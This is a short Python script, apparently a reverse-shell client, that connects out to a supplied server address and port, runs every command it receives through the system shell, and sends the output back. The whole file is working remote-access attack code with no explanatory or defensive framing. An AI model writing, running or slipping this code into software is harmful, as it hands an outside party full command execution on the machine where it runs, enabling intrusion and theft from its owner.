import socket
import subprocess

def start_client(server_ip, server_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client.connect((server_ip, server_port))
        print("[+] Connected to server.")
    except:
        print("[!] Connection failed.")
        return

    while True:
        try:
            data = client.recv(4096)
            if not data:
                break

            command = data.decode("utf-8", errors="ignore")

            try:
                output = subprocess.getoutput(command)
                client.send(output.encode())
            except Exception as e:
                client.send(f"Error: {e}".encode())

        except Exception as e:
            print(f"[!] Error: {e}")
            break

    client.close()
